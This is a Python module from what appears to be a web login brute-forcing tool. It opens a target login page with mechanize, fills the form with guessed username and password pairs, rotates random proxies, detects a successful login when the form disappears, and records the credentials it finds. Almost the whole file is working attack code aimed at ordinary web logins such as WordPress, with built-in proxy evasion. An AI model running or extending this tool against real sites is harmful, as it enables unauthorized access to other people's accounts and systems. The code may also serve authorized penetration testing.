import mechanize
from core import utils, actions, tbrowser		


def check_condition(options, proc, loginInfo):

	"""
		Check logged in successfully condition.
		This function will check SQL injection as well
			return 0 -> False
			return 1 -> True
			return 2 -> Should be SQL Injection error-based
	"""
	if options.panel_url:
		# User provided panel url (/wp-admin/ for example, repopen this url to check sess)
		proc.open(options.panel_url)
		if tbrowser.parseLoginForm(proc.forms()) != loginInfo:
			return 1
		else:
			return 0
	else:
		# User provided direct login URL (/wp-login.php).
		# TODO improve this condition
		return 1


def submit(options, loginInfo, tryCred, result):

	#	Get login form field informations
	
	# BUG parse form issue with gmail, move to tbrowser.parseLoginForm
	frmLoginID, frmFields = loginInfo
	tryPassword, tryUsername = tryCred
	
	proc = tbrowser.startBrowser()
	
	for cred in list(result.queue):
		if "--reauth" not in options.extras:
			if tryUsername == cred[0]:
				return True # don't run if find password of username
		else:
			if tryUsername == cred[1]:
				return True # don't run if find password of username
	
	if options.proxy:
		# Set proxy connect
		proxyAddr = actions.randomFromList(options.proxy)
		proc.set_proxies({"http": proxyAddr})
	
	try:

		proc.open(options.login_url)
		title = proc.title()

		#	Select login form

		proc.select_form(nr = frmLoginID)
		
		# FILLS ALL FIELDS https://stackoverflow.com/a/5389578
		
		for field, cred in zip(frmFields, tryCred):
			proc.form[field] = cred

		#page_title = proc.title()
		#	Send request
		proc.submit()

		if options.verbose:
			if options.proxy:
				utils.printf("[+] Trying: %s through %s" %([tryUsername, tryPassword],proxyAddr), 'norm')
			else:
				utils.printf("[+] Trying: %s" %([tryUsername, tryPassword]), 'norm')
		
		#	Reload the browser. For javascript redirection and others...
		proc.reload()
		#	If no login form -> maybe success. Check conditions
		#	TODO improve condition to use captcha
		
		if tbrowser.parseLoginForm(proc.forms()) != loginInfo:
			test_result = check_condition(options, proc, loginInfo)

			if test_result:
				utils.printf("[*] Get page: ['%s']" %(proc.title()), "good")
				
				# "If we tried login form with username+password field"
				if tryUsername:
					utils.printf("[*] Match found: %s" %([tryUsername, tryPassword]), "good")
				# "Else If we tried login form with password field only"
				else:
					utils.printf("[*] Password found: %s" %([tryPassword]), "good")
				# "End of condition block"
				
				# "Check for Extras option reauth", return result w/ right format
				if "--reauth" not in options.extras:
					result.put([tryUsername, tryPassword])
				else:
					result.put([options.url.split("/")[2], tryUsername, tryPassword])
			
			else:
				# Possibly Error. But sometime it is true
				utils.printf("[x] Possibly error %s" %(
					[tryUsername, tryPassword]),
				"bad")
				utils.printf("[*] Get page: ['%s']" %(proc.title()), "bad")
				if options.verbose:
					utils.printf("[*] %s" %(proc.title()), "good")
		
		# "Login form is still there. Oops"
		else:
			if options.verbose:
				if options.proxy:
					utils.printf(
						"[-] Failed: %s through %s" %([tryUsername, tryPassword], proxyAddr),
						"bad"
					)
				else:
					utils.printf(
						"[-] Failed: %s" %([tryUsername, tryPassword]),
						"bad"
					)
		return True

	except mechanize.HTTPError as error:
		# TODO get HTTP error code, show err msg as return code
		#	Get blocked
		if options.verbose:
			utils.printf("[x] Attacking: %s %s" %(error, [tryUsername, tryPassword]), "bad")
		return False

	except Exception as error:
		if options.verbose:
			utils.printf("[x] Attacking: %s %s" %(error, [tryUsername, tryPassword]), "bad")
		return False

	finally:
		proc.close()